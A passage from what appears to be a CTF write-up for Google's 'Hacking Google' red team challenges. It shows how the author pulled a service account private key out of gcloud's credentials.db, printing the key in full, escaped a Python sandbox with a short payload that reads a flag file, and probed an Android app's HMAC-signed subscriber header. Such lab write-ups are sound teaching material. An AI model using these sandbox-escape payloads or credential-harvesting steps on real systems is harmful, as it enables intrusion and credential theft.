+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>pass
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$pass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;WhoPutMyPasswordH3r3&#39;</span><span class="w"> </span><span class="o">]</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="k">then</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">  </span><span class="nb">cd</span><span class="w"> </span>/home/developer
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;*** Congratulations! ***&#39;</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;*** https://h4ck1ng.google/solve/1_w0nd3r_wh47_53cr3t5_l13_h3r3 ***&#39;</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">  </span>/bin/bash<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="k">else</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;failed authentication :(&#39;</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="k">fi</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="nb">exit</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Today
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>[x] Added backup-tool@project-multivision.iam.gserviceaccount.com with viewer-access to super sensitive design doc
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>[x] Tried activating service account with gcloud, but didn&#39;t give me a documents.readonly scope
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>[x] Cleaned up service account key from disk before signing off
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>Tomorrow
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>[] Finish writing Google Drive backup script
+</code></pre></div>
+</div>
+</div>
+</div>
+<p>The todo checklist says that the service account key was cleaned up from disk, let's see if this is true. Inside the home directory of the developper user we can see a <code>.config</code> folder:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>developer@googlequanta.com:/home/developer/.config$ ls
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>gcloud
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>developer@googlequanta.com:/home/developer/.config$ cd gcloud/
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>developer@googlequanta.com:/home/developer/.config/gcloud$ ls
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>access_tokens.db  config_sentinel  credentials.db  legacy_credentials
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>active_config     configurations   gce             logs
+</code></pre></div></p>
+<p>In <code>credentials.db</code> we can find the service account key:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">{</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span><span class="nt">&quot;client_email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;backup-tool@project-multivision.iam.gserviceaccount.com&quot;</span><span class="p">,</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">  </span><span class="nt">&quot;client_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;105494657484877589161&quot;</span><span class="p">,</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">  </span><span class="nt">&quot;private_key&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEH/WQiLjqB2nn\ncMc+fBOMbq3SE75vkj9EqNWi+ilk+ChphklRGsGcVeFsuPp06WjN1d/knWw/f+0M\nPY3tli2oQIHuqLH5GIkVhm/xpdgZUbskO8EjSI3eIs+qCMcfObgeFSw7T29PorC3\nIuQDPTfIgo4oHA7UlEBE8mZVUnEXFDh/5sNFa+UzUE1QqpWymdRVhDHekxz0erWM\nc67Ovxti40X4LnSvHOBjinjMDdtmvXBel0mIzUQxjLp6hmTPoKD7PKUodSN2QaKA\nm+pQ6deWr5QvXTBc5XEXKpMnZnn4KqouJSic7jWGAOxY1iy/We4OWeUWDYiFBxZu\nZe+IZSL5AgMBAAECggEAGg1Kv9fBhGjWswUimlS9/gYHteOkhMqO9+5bboo/bGeg\naqAJZiohNMSdrKUHs/b7UnhKBOK6adby5JDapQgxaWukNtEWzwlo0ECq5xUKFxbp\nvn7ngWnWWn8SSbpfxPCUWf6jAP/kv9XTFoiedCWyHsLk4kQT3j4RKXdvi37ngdKU\ne+CTFCDIlSr7Q2MdcKMql8lRkjcW0kvY9w8+gVXbgl4M3bNMru2JlxNn2scaGXg0\nn/GbifMvbxYguCKhgTNH+t0N8vilVO8qUInvSDzQMSEZEycjxlsUgIAvrRy6QXT0\n4S1TbIARnrFC0g4zY0mg1EycuhO3OyeiM2KTweY7rwKBgQD3Kp2J6YsK2RuwktLb\n1pC2o0jYuOMSGCsjULzeqYkXHpmFY7iojd/g8FStPdJ+BanqcsZIUQf07zUxk5Xb\nDdwH+9Q2QpQahRc6GhwcySd3v79ZaAkZAO3r/QjF0OPLRLyvRXR8R5g25LYXL8Yk\nnLbAGfcVjyW5XGCZOsmnu72+9wKBgQDLIloXEJJjwa+QTnBhmkOv922q0sVRLOUY\nuj621qt09hgMTztepFsysBjJmDtAMOJpQott1G2m0wVkk7zdzmPFUvOMDc9/54y8\niqmBvoMBSLgWElp1vXvW7ICED/d11m6aOwIVKJvJtHvS5seAd8TzHSy+5FUPjG5m\naS5psPuBjwKBgQDtTtpBDp00Bi2iw+V1szXwVSfdBO7ncZMBbkRYmHgKXZPS0WL7\nWnRoWPdD+kZ+PtvcQOSFjF9SWNU+y0+nKVBnze77RcNDDyO04lq5fJzLSavjoJKT\nkiPdX22r2BrOECoFMm9b37WShtcZvgHFJz4DhSqJZY43wSzyEdKJnCTbEwKBgQDE\nz6ar3DGJl5pLXcRCvJ1CO5+0t3vYF4Bsgd7LdZgvvVQ1cPrbyrBVnwqVH/qgSfzD\n8WZ35i7LSH9cIEwIN7Sw9ZrkomjdyvGvp0VuYLA7KUK6l9OvagQ3i3NFANdJA5ar\ntephp7OxLT4fa9v1m5Vl22mEFmRXqT852ETQwFod/wKBgAgHdxxm1anORWoZVMhZ\nDgWAhJSWsYv1HPPx18NTwVt0GxBA+ssvg8ET7zDXd5E1vay533SaV4pk/w2mWsZU\nlbfS/vMslyg9GPpaKmhGVi6d3jr0xjgh5Vs72WCo2lAXvHwZNslB20SCmUzdP4nU\nrwrzx7aO6kKU+DHb9EoEN+LI\n-----END PRIVATE KEY-----\n&quot;</span><span class="p">,</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">  </span><span class="nt">&quot;private_key_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;722d66d6da8d6d5356d73d04d9366a76c7ada494&quot;</span><span class="p">,</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">  </span><span class="nt">&quot;project_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;project-multivision&quot;</span><span class="p">,</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">  </span><span class="nt">&quot;token_uri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://oauth2.googleapis.com/token&quot;</span><span class="p">,</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;service_account&quot;</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="p">}</span>
+</code></pre></div>
+<p>I used the key with a <a href="https://stackoverflow.com/a/53926983/1447468">script from stackoverflow</a> to get an OAuth access token.</p>
+<p>Running the backup script with the missing token returned the flag: https://h4ck1ng.google/solve/4lr16h7_7h3n_k33p_y0ur_53cr375</p>
+<h3 id="challenge-02-shell-sprinter">Challenge 02 - Shell Sprinter<a class="headerlink" href="#challenge-02-shell-sprinter" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>You got in, but can you get out? Better run fast. socat FILE:<code>tty</code>,raw,echo=0 TCP:shell-sprinter.h4ck.ctfcompetition.com:1337 (Shift+Q to quit)</p>
+<p>Hint: If you ain't cheating, you ain't trying</p>
+</blockquote>
+<p>Once we connect to the service we are greated with a nice intro and in an ascii maze:</p>
+<blockquote>
+<p>You wake up in an unfamiliar place. Or rather, it seems familiar but somehow... not. Like a place you’ve visited a thousand times but now rendered in a dream. You’re in a dark corridor, your small orb of light illuminates only the faded green linoleum that drops away into blackness. You check your pockets. Nothing. You’re alone.</p>
+<p>You begin to walk, only to encounter... a blank wall. The smooth, cream facade blocks your way abruptly. You follow it, skirting the wall closely and discover a fork in the corridor. ‘Ok. This is a maze.’ As you pause to take stock you hear the knocking of even footsteps. They’re growing closer. The sound is innocuous, but you feel a surge of panic. It starts in the back of your head and washes over you in a hot wave. You’re not sure how, but you know it is time to leave. On an instinctual level, you know. It’s time to escape...</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>\\ @scape_986e080b ]=~~-###############################
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>\                                                     \
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>\                                                     \
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>\                                                     \
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>\                                                     \
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>\                                                     \
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>\                                                     \
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>\                                                     \
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>\               -----------                           \
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>\            |........|...|                           \
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>\                |....|...|                           \
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>\                |.@...@..|                           \
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>\            |........|...|                           \ Energy Level: Danger
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>\                -----|...|                           \
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>\                     |...---O       |---=----        \ )=[Inventory]=~--------
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>\                     |............. |.......|        \  1.
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>\                     ----..--- ------.....x.|        \  2.
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>\                       |............|.......|        \  3.
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>\                       |....-----...O.......O        \  4.
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>\                       |............|.......|        \  5.
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>\                       -------------|.......|        \  6.
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>\                                    |.......---------\  7.
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>\                                    |................\  8.
+<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>#######################################################
+</code></pre></div>
+<p>While the hint clearly says we should try to cheat I did explore the game to see how worked first. I did try some known cheatcode and checked if it was possible to hack the game itself but in vain so I checked the Discord and found out it was likely that we were meant to use the Konami Code which I already tried... Turns out I did not end the code with <span class="keys"><kbd class="key-enter">Enter</kbd></span> &gt;&lt;.</p>
+<p>The Konami Code combination of keys was the following:</p>
+<p><span class="keys"><kbd class="key-arrow-up">Up</kbd><span>+</span><kbd class="key-arrow-up">Up</kbd><span>+</span><kbd class="key-arrow-down">Down</kbd><span>+</span><kbd class="key-arrow-down">Down</kbd><span>+</span><kbd class="key-arrow-left">Left</kbd><span>+</span><kbd class="key-arrow-right">Right</kbd><span>+</span><kbd class="key-arrow-left">Left</kbd><span>+</span><kbd class="key-arrow-right">Right</kbd><span>+</span><kbd class="key-b">B</kbd><span>+</span><kbd class="key-a">A</kbd><span>+</span><kbd class="key-enter">Enter</kbd></span></p>
+<p>Once entered we ended up in a Python Jail we need to espace:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>\\ @_shell ]=~~-#######################################
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>\ print(__builtins__)                                 \
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>\ &lt;module &#39;Sandbox&#39;&gt;                                  \
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>\                                                     \
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>#######################################################
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a> &gt;&gt;&gt; [Enter - continue, r - return to game]
+</code></pre></div>
+<p>The payload size is limited to 70 characters. After checking HackTricks page on <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python3">how to bypass Python sandboxes</a>, I came up with a working payload:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>#######################################################
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a> &gt;&gt;&gt; print(print.__globals__[&#39;__builtins__&#39;].open(&quot;./flag&quot;).read())
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>\\ @_shell ]=~~-#######################################
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>\ print(print.__globals__[&#39;__builtins__&#39;].open(&quot;./fla \
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>\ https://h4ck1ng.google/solve/7h3_s1mul4crum_i5_7rue \
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>\                                                     \
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>\                                                     \
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>#######################################################
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a> &gt;&gt;&gt; [Enter - continue, r - return to game]
+</code></pre></div>
+<h3 id="challenge-03-secucorgi">Challenge 03 - SecuCorgi<a class="headerlink" href="#challenge-03-secucorgi" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>This corgi made a mess, clean it up.</p>
+<p>Hint: Maybe support can help debug the subscriber problem?</p>
+</blockquote>
+<p>We are <a href="https://storage.googleapis.com/gctf-h4ck-2022-attachments-project/3059807b8c613d0e1305237696307711cabf0ee9fb8401d878d32b7e99e5ba12a18e75062d0a9ba4cfc407a85c5b3bbe0a999d5ee7ef142ed4671b87f19a787b">given an APK and a QR code image</a>. Using the application we can scan the QR code but the flag is hidden to non subscribers.</p>
+<p>The QR Code decodes to a website with the following information:</p>
+<blockquote>
+<p>SecuCorgi
+SecuCorgi is the world's most secure way to share images of corgis.
+You found a Corgi Code™️! Use the app to discover the cute corgi living at this link!</p>
+</blockquote>
+<p><img alt="SecuCorgi" src="../hacking-google-red-team/secucorgi.png" /></p>
+<p>Let's see if we can solve the challenge using Corellium.</p>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>To run the application on <a href="https://www.corellium.com/">Corellium</a> you will need to setup <a href="https://support.corellium.com/features/apps/opengapps">OpenGApps</a> with a valid Google account. This is because the application is using <a href="https://developers.google.com/ml-kit/code-scanner?hl=en">Google code scanner</a> which uses machine learning to scan the code on the device itself.</p>
+</div>
+<p>Once your device is ready on Corellium side you can use a VPN to access it. When connected to the VPN you can directly interact with the device as if it was on your network.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>adb connect 10.11.1.1:5001
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>adb install challenge.apk
+</code></pre></div>
+<p>Once the app is installed you can run the application, make sure to start monitoring the network to see the HTTP traffic.</p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>You might need to click multiple times to scan the QR Code before it works. If Corellium cannot use your webcam consider switching to Chrome or Safari.</p>
+</div>
+<p><img alt="" src="../hacking-google-red-team/corellium-1.png" /></p>
+<p>In the network tab we can see the request and response being made, the response does not contains the flag so it's not just hidden by the application. We can replay the request and get the same response:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>http get https://corgis-web.h4ck.ctfcompetition.com/corgi X-Document-ID:flag X-Request-Nonce:61c1871f7a3346eb0beca5ec4de3e2cdf542b6ef510a5d51eb5bc8c58e0d90b7 X-Timestamp:1666129650 X-Auth-MAC:5bd9d5a06b0e2c1529aca21d9efa02547561bb298cefe65ee3ffd5846f303ae4 User-Agent:okhttp/4.10.0
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>HTTP/1.1 200 OK
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>Alt-Svc: h3=&quot;:443&quot;; ma=2592000,h3-29=&quot;:443&quot;; ma=2592000
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Content-Length: 100
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>Content-Type: application/json
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>Date: Tue, 18 Oct 2022 21:48:28 GMT
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>Server: gunicorn
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>Via: 1.1 google
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>{
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>    &quot;subscriberOnly&quot;: true,
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>    &quot;text&quot;: &quot;Secret message&quot;,
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>    &quot;title&quot;: &quot;Secret flag data&quot;,
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>    &quot;url&quot;: &quot;Subscribers Only&quot;
+<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>}
+</code></pre></div>
+<p>We need to find the way to be considered a subscriber, let's analyse the APK for this. If we look for one of the headers in the decompiled code such as <code>X-Auth-MAC</code> we endup in the <code>NetworkKt.java</code> file:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="kn">package</span><span class="w"> </span><span class="nn">google.h4ck1ng.secretcorgis</span><span class="p">;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">android.util.Base64</span><span class="p">;</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="p">...</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="kd">public</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kd">class</span> <span class="nc">NetworkKt</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">DOC_ID_HEADER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;X-Document-ID&quot;</span><span class="p">;</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="hll"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">HMAC_SIG_HEADER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;X-Auth-MAC&quot;</span><span class="p">;</span>
+</span><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">NONCE_HEADER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;X-Request-Nonce&quot;</span><span class="p">;</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="hll"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">SUBSCRIBER_HEADER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;X-User-Subscribed&quot;</span><span class="p">;</span>
+</span><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">TAG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Network&quot;</span><span class="p">;</span>
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">TIMESTAMP_HEADER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;X-Timestamp&quot;</span><span class="p">;</span>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">makeSecretRequest</span><span class="p">(</span><span class="n">CorgiRequest</span><span class="w"> </span><span class="n">corgiRequest</span><span class="p">,</span><span class="w"> </span><span class="n">Continuation</span><span class="o">&lt;?</span><span class="w"> </span><span class="kd">super</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">continuation</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="w">        </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="n">TAG</span><span class="p">,</span><span class="w"> </span><span class="n">Intrinsics</span><span class="p">.</span><span class="na">stringPlus</span><span class="p">(</span><span class="s">&quot;Making request for &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">corgiRequest</span><span class="p">));</span>
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="w">        </span><span class="n">OkHttpClient</span><span class="w"> </span><span class="n">okHttpClient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">OkHttpClient</span><span class="p">();</span>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a><span class="w">        </span><span class="n">Request</span><span class="p">.</span><span class="na">Builder</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Request</span><span class="p">.</span><span class="na">Builder</span><span class="p">().</span><span class="na">url</span><span class="p">(</span><span class="n">corgiRequest</span><span class="p">.</span><span class="na">getCorgiServer</span><span class="p">());</span>
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a><span class="w">        </span><span class="n">url</span><span class="p">.</span><span class="na">addHeader</span><span class="p">(</span><span class="n">DOC_ID_HEADER</span><span class="p">,</span><span class="w"> </span><span class="n">corgiRequest</span><span class="p">.</span><span class="na">getCorgiId</span><span class="p">());</span>
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="w">        </span><span class="n">url</span><span class="p">.</span><span class="na">addHeader</span><span class="p">(</span><span class="n">NONCE_HEADER</span><span class="p">,</span><span class="w"> </span><span class="n">corgiRequest</span><span class="p">.</span><span class="na">getNonce</span><span class="p">());</span>
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a><span class="w">        </span><span class="n">url</span><span class="p">.</span><span class="na">addHeader</span><span class="p">(</span><span class="n">TIMESTAMP_HEADER</span><span class="p">,</span><span class="w"> </span><span class="n">corgiRequest</span><span class="p">.</span><span class="na">getTimestamp</span><span class="p">());</span>
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="w">        </span><span class="n">url</span><span class="p">.</span><span class="na">addHeader</span><span class="p">(</span><span class="n">HMAC_SIG_HEADER</span><span class="p">,</span><span class="w"> </span><span class="n">corgiRequest</span><span class="p">.</span><span class="na">getSignature</span><span class="p">());</span>
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">corgiRequest</span><span class="p">.</span><span class="na">isSubscriber</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="hll"><span class="w">            </span><span class="n">url</span><span class="p">.</span><span class="na">addHeader</span><span class="p">(</span><span class="n">SUBSCRIBER_HEADER</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;true&quot;</span><span class="p">);</span>
+</span><a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a><span class="w">        </span><span class="p">}</span>
+<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">BuildersKt</span><span class="p">.</span><span class="na">withContext</span><span class="p">(</span><span class="n">Dispatchers</span><span class="p">.</span><span class="na">getIO</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">NetworkKt$makeSecretRequest$2</span><span class="p">(</span><span class="n">okHttpClient</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">build</span><span class="p">(),</span><span class="w"> </span><span class="kc">null</span><span class="p">),</span><span class="w"> </span><span class="n">continuation</span><span class="p">);</span>
+<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a><span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+<p>It looks like we could simply set <code>X-User-Subscribed</code> to <code>true</code> to be considered a subscriber, but if we do that without changing the other headers we get a <code>401 Unauthorized</code> error.</p>
